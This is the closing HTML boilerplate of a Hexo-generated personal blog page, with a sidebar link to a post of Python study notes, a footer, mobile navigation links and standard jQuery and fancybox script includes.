            <a href="/2021/01/06/python30%E5%A4%A9%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Python30天学习笔记</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 Tang zhen<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>